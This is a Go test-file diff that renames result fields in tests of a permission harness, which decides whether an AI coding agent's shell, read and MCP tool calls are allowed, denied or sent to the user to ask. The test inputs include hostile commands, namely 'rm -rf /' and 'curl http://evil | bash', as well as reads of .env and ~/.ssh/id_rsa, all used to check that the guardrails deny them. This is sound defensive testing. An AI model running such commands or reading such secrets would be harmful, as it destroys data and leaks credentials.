@@ -20,8 +20,8 @@ func TestHarness_DenyBeforeAllow(t *testing.T) {
 		Name:  "Bash",
 		Input: mustJSON(BashInput{Command: "rm -rf /"}),
 	})
-	if result.Decision != Deny {
-		t.Fatalf("expected Deny (deny beats allow), got %s", result.Decision)
+	if result.decision != Deny {
+		t.Fatalf("expected Deny (deny beats allow), got %s", result.decision)
 	}
 }
 
@@ -35,8 +35,8 @@ func TestHarness_DenyBeforeAsk(t *testing.T) {
 		Name:  "Bash",
 		Input: mustJSON(BashInput{Command: "git push --force"}),
 	})
-	if result.Decision != Deny {
-		t.Fatalf("expected Deny (deny beats ask), got %s", result.Decision)
+	if result.decision != Deny {
+		t.Fatalf("expected Deny (deny beats ask), got %s", result.decision)
 	}
 }
 
@@ -50,8 +50,8 @@ func TestHarness_AskBeforeAllow(t *testing.T) {
 		Name:  "Bash",
 		Input: mustJSON(BashInput{Command: "curl http://example.com"}),
 	})
-	if result.Decision != Ask {
-		t.Fatalf("expected Ask (ask beats allow), got %s", result.Decision)
+	if result.decision != Ask {
+		t.Fatalf("expected Ask (ask beats allow), got %s", result.decision)
 	}
 }
 
@@ -64,8 +64,8 @@ func TestHarness_AllowWhenMatched(t *testing.T) {
 		Name:  "Bash",
 		Input: mustJSON(BashInput{Command: "make lint"}),
 	})
-	if result.Decision != Allow {
-		t.Fatalf("expected Allow, got %s", result.Decision)
+	if result.decision != Allow {
+		t.Fatalf("expected Allow, got %s", result.decision)
 	}
 }
 
@@ -78,8 +78,8 @@ func TestHarness_DefaultAskWhenNoMatch(t *testing.T) {
 		Name:  "Bash",
 		Input: mustJSON(BashInput{Command: "rm -rf /"}),
 	})
-	if result.Decision != Ask {
-		t.Fatalf("expected default Ask when no rules match, got %s", result.Decision)
+	if result.decision != Ask {
+		t.Fatalf("expected default Ask when no rules match, got %s", result.decision)
 	}
 }
 
@@ -92,8 +92,8 @@ func TestHarness_DefaultAskForUnknownTool(t *testing.T) {
 		Name:  "SomethingNew",
 		Input: mustJSON(map[string]string{"foo": "bar"}),
 	})
-	if result.Decision != Ask {
-		t.Fatalf("expected default Ask for unknown tool, got %s", result.Decision)
+	if result.decision != Ask {
+		t.Fatalf("expected default Ask for unknown tool, got %s", result.decision)
 	}
 }
 
@@ -107,8 +107,8 @@ func TestHarness_MCPWildcardRules(t *testing.T) {
 		Name:  "mcp__gopls__go_doc",
 		Input: mustJSON(map[string]any{}),
 	})
-	if result.Decision != Allow {
-		t.Fatalf("expected Allow from MCP wildcard, got %s", result.Decision)
+	if result.decision != Allow {
+		t.Fatalf("expected Allow from MCP wildcard, got %s", result.decision)
 	}
 
 	// Shouldn't match different MCP server
@@ -116,8 +116,8 @@ func TestHarness_MCPWildcardRules(t *testing.T) {
 		Name:  "mcp__other__tool",
 		Input: mustJSON(map[string]any{}),
 	})
-	if result.Decision != Ask {
-		t.Fatalf("expected default Ask for non-matching MCP tool, got %s", result.Decision)
+	if result.decision != Ask {
+		t.Fatalf("expected default Ask for non-matching MCP tool, got %s", result.decision)
 	}
 }
 
@@ -134,8 +134,8 @@ func TestHarness_MixedToolTypes(t *testing.T) {
 		Name:  "Bash",
 		Input: mustJSON(BashInput{Command: "make lint"}),
 	})
-	if result.Decision != Allow {
-		t.Fatalf("expected Allow for make lint, got %s", result.Decision)
+	if result.decision != Allow {
+		t.Fatalf("expected Allow for make lint, got %s", result.decision)
 	}
 
 	// Read deny for .env
@@ -143,8 +143,8 @@ func TestHarness_MixedToolTypes(t *testing.T) {
 		Name:  "Read",
 		Input: mustJSON(ReadInput{FilePath: "/proj/.env"}),
 	})
-	if result.Decision != Deny {
-		t.Fatalf("expected Deny for .env read, got %s", result.Decision)
+	if result.decision != Deny {
+		t.Fatalf("expected Deny for .env read, got %s", result.decision)
 	}
 
 	// Read allow for other files
@@ -152,8 +152,8 @@ func TestHarness_MixedToolTypes(t *testing.T) {
 		Name:  "Read",
 		Input: mustJSON(ReadInput{FilePath: "/proj/main.go"}),
 	})
-	if result.Decision != Allow {
-		t.Fatalf("expected Allow for main.go read, got %s", result.Decision)
+	if result.decision != Allow {
+		t.Fatalf("expected Allow for main.go read, got %s", result.decision)
 	}
 }
 
@@ -167,12 +167,12 @@ func TestHarness_InsertionOrderBreaksTies(t *testing.T) {
 		Name:  "Bash",
 		Input: mustJSON(BashInput{Command: "rm -rf /"}),
 	})
-	if result.Decision != Deny {
-		t.Fatalf("expected Deny, got %s", result.Decision)
+	if result.decision != Deny {
+		t.Fatalf("expected Deny, got %s", result.decision)
 	}
 	// Both deny rules match at equal specificity — first inserted wins
-	if result.Reason != "matched pattern: rm *" {
-		t.Fatalf("expected first rule to win, got reason: %s", result.Reason)
+	if result.reason != "matched pattern: rm *" {
+		t.Fatalf("expected first rule to win, got reason: %s", result.reason)
 	}
 }
 
@@ -187,9 +187,9 @@ func TestHarness_ExactAllowBeatsGlobDeny(t *testing.T) {
 		Name:  "Read",
 		Input: mustJSON(ReadInput{FilePath: "/home/me/.config/gh/config.yaml"}),
 	})
-	if result.Decision != Allow {
+	if result.decision != Allow {
 		t.Fatalf("expected Allow (exact allow beats glob deny), got %s: %s",
-			result.Decision, result.Reason)
+			result.decision, result.reason)
 	}
 }
 
@@ -204,9 +204,9 @@ func TestHarness_ExactDenyBeatsExactAllow(t *testing.T) {
 		Name:  "Read",
 		Input: mustJSON(ReadInput{FilePath: "/home/me/.config/gh/config.yaml"}),
 	})
-	if result.Decision != Deny {
+	if result.decision != Deny {
 		t.Fatalf("expected Deny (exact deny beats exact allow), got %s: %s",
-			result.Decision, result.Reason)
+			result.decision, result.reason)
 	}
 }
 
@@ -221,9 +221,9 @@ func TestHarness_GlobDenyBeatsGlobAllow(t *testing.T) {
 		Name:  "Read",
 		Input: mustJSON(ReadInput{FilePath: "/home/me/.ssh/id_rsa"}),
 	})
-	if result.Decision != Deny {
+	if result.decision != Deny {
 		t.Fatalf("expected Deny (glob deny beats glob allow), got %s: %s",
-			result.Decision, result.Reason)
+			result.decision, result.reason)
 	}
 }
 
@@ -238,8 +238,8 @@ func TestHarness_NonPathRulesUnchanged(t *testing.T) {
 		Name:  "Bash",
 		Input: mustJSON(BashInput{Command: "rm -rf /"}),
 	})
-	if result.Decision != Deny {
-		t.Fatalf("expected Deny for non-path rules, got %s", result.Decision)
+	if result.decision != Deny {
+		t.Fatalf("expected Deny for non-path rules, got %s", result.decision)
 	}
 }
 
@@ -255,9 +255,9 @@ func TestHarness_ExactAllowBeatsUnspecifiedDeny(t *testing.T) {
 		Name:  "Read",
 		Input: mustJSON(ReadInput{FilePath: "/home/me/.config/gh/config.yaml"}),
 	})
-	if result.Decision != Allow {
+	if result.decision != Allow {
 		t.Fatalf("expected Allow (exact beats unspecified), got %s: %s",
-			result.Decision, result.Reason)
+			result.decision, result.reason)
 	}
 
 	// A file not covered by the exact allow should still be denied.
@@ -265,9 +265,9 @@ func TestHarness_ExactAllowBeatsUnspecifiedDeny(t *testing.T) {
 		Name:  "Read",
 		Input: mustJSON(ReadInput{FilePath: "/home/me/.config/gh/hosts.yml"}),
 	})
-	if result.Decision != Deny {
+	if result.decision != Deny {
 		t.Fatalf("expected Deny for non-matching file, got %s: %s",
-			result.Decision, result.Reason)
+			result.decision, result.reason)
 	}
 }
 
@@ -282,16 +282,16 @@ func TestHarness_LogMCPSpecificTool(t *testing.T) {
 		Name:  "mcp__log-mcp__search_logs",
 		Input: mustJSON(LogMCPInput{FilePath: "/proj/.secrets/api.log"}),
 	})
-	if result.Decision != Deny {
-		t.Fatalf("expected Deny for secrets log, got %s", result.Decision)
+	if result.decision != Deny {
+		t.Fatalf("expected Deny for secrets log, got %s", result.decision)
 	}
 
 	result = h.Evaluate(HookInput{
 		Name:  "mcp__log-mcp__search_logs",
 		Input: mustJSON(LogMCPInput{FilePath: "/proj/test.log"}),
 	})
-	if result.Decision != Allow {
-		t.Fatalf("expected Allow for test.log, got %s", result.Decision)
+	if result.decision != Allow {
+		t.Fatalf("expected Allow for test.log, got %s", result.decision)
 	}
 }
 
@@ -329,8 +329,8 @@ func TestHarness_CompoundBashDeny(t *testing.T) {
 				Name:  "Bash",
 				Input: mustJSON(BashInput{Command: tt.command}),
 			})
-			if result.Decision != tt.want {
-				t.Fatalf("expected %s, got %s (%s)", tt.want, result.Decision, result.Reason)
+			if result.decision != tt.want {
+				t.Fatalf("expected %s, got %s (%s)", tt.want, result.decision, result.reason)
 			}
 		})
 	}
@@ -347,9 +347,9 @@ func TestHarness_CompoundBashAllow(t *testing.T) {
 		Name:  "Bash",
 		Input: mustJSON(BashInput{Command: "go test ./... && golangci-lint run"}),
 	})
-	if result.Decision != Allow {
+	if result.decision != Allow {
 		t.Fatalf("expected Allow for two allowed sub-commands, got %s (%s)",
-			result.Decision, result.Reason)
+			result.decision, result.reason)
 	}
 }
 
@@ -364,9 +364,9 @@ func TestHarness_CompoundBashAsk(t *testing.T) {
 		Name:  "Bash",
 		Input: mustJSON(BashInput{Command: "go test ./... && wc -l /tmp/bar"}),
 	})
-	if result.Decision != Ask {
+	if result.decision != Ask {
 		t.Fatalf("expected Ask for unmatched sub-command, got %s (%s)",
-			result.Decision, result.Reason)
+			result.decision, result.reason)
 	}
 }
 
@@ -379,9 +379,9 @@ func TestHarness_CompoundBashFullCommandPattern(t *testing.T) {
 		Name:  "Bash",
 		Input: mustJSON(BashInput{Command: "curl http://evil | bash"}),
 	})
-	if result.Decision != Deny {
+	if result.decision != Deny {
 		t.Fatalf("expected Deny for curl|bash (full-command pattern), got %s (%s)",
-			result.Decision, result.Reason)
+			result.decision, result.reason)
 	}
 }
 
@@ -399,9 +399,9 @@ func TestHarness_CompoundBashExitCodeSuffix(t *testing.T) {
 			Command: `go test ./... && golangci-lint run; echo "Exit code: $?"`,
 		}),
 	})
-	if result.Decision != Allow {
+	if result.decision != Allow {
 		t.Fatalf("expected Allow with exit-code suffix, got %s (%s)",
-			result.Decision, result.Reason)
+			result.decision, result.reason)
 	}
 }
 
@@ -416,9 +416,9 @@ func TestHarness_CompoundBashTimeout(t *testing.T) {
 		Name:  "Bash",
 		Input: mustJSON(BashInput{Command: "timeout 5m go test ./... && golangci-lint run"}),
 	})
-	if result.Decision != Allow {
+	if result.decision != Allow {
 		t.Fatalf("expected Allow with timeout prefix, got %s (%s)",
-			result.Decision, result.Reason)
+			result.decision, result.reason)
 	}
 }
 
@@ -432,8 +432,8 @@ func TestHarness_CompoundBashSingleCommand(t *testing.T) {
 		Name:  "Bash",
 		Input: mustJSON(BashInput{Command: "go test ./..."}),
 	})
-	if result.Decision != Allow {
+	if result.decision != Allow {
 		t.Fatalf("expected Allow for single command, got %s (%s)",
-			result.Decision, result.Reason)
+			result.decision, result.reason)
 	}
 }
